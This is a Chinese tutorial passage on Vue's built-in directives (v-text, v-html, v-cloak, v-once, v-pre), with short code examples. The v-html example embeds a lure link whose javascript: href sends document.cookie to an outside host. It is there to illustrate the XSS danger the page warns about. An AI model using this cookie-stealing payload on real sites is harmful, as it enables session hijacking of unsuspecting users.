---
description: 内置指令
autoPrev: filter
---

# 内置指令

在Vue中提供了一些对于页面 + 数据的更为方便的输出，这些操作就叫做指令，以`v-xx` 表示。

我们上面文章用到的 `v-if`，`v-show`，`v-on` 等都属于内置指令，接下来继续介绍其他常用的内置指令。

### v-text

```html
<div id="root">
  <div v-text="name"></div>
</div>
```

```js
<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'Hello Vue'
    }
  })
</script>
```
和插值语法`{{}}` 有点类似，但是 `v-text` 会替换掉节点中的内容，而`{{xx}}` 不会

### v-html

向指定节点中渲染包含html结构的内容。

```html
<div id="root">
  <div v-html="str"></div>
  <div v-html="str2"></div>
</div>
```

```js
<script type="text/javascript">
		new Vue({
			el:'#root',
			data:{
				str:'<h3>你好啊！</h3>',
				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
			}
		})
	</script>
```

**<div style="color:red">注意</div>**：

v-html有安全性问题！！！！

在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。

一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！


### v-vloak

 v-cloak 指令设置样式，这些样式会在 Vue 实例编译结束时，从绑定的 HTML 元素上被移除。

当网络较慢，网页还在加载 Vue.js ，而导致 Vue 来不及渲染，这时页面就会显示出 Vue 源代码。我们可以使用 `v-cloak` 指令来解决这一问题。

```html
<div id="root">
  <h2 v-cloak>{{name}}</h2>
</div>
```

```js
<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      name:'Hello'
    }
  })
</script>
```
如果不加 `v-cloak` 在网速慢的情况下，会显示 `{{name}}`，之后才会渲染。

### v-once

v-once这个指令不需要任何表达式，它的作用就是定义它的元素或组件只会渲染一次，包括元素或者组件的所有字节点。首次渲染后，不再随着数据的改变而重新渲染。也就是说使用 `v-once`，那么该块都将被视为静态内容。

```html
<div id="root">
  <h2 v-once>初始化的n值是:{{n}}</h2>
  <h2>当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
```

```js
<script type="text/javascript"> 
  new Vue({
    el:'#root',
    data:{
      n:1
    }
  })
</script>
```

点击按钮没使用 `v-once` 的会发生改变，使用 `v-once` 的不会发生改变。

### v-pre

`v-pre` 跳过其所在节点的编译过程
```html
<div id="root">
  <h2 v-pre>当前的n值是:{{n}}</h2>
  <h2 >当前的n值是:{{n}}</h2>
  <button @click="n++">点我n+1</button>
</div>
```

```js
<script type="text/javascript">
  new Vue({
    el:'#root',
    data:{
      n:1
    }
  })
</script>
```
使用 `v-pre` 的标签里面的插值表达式就失效了。


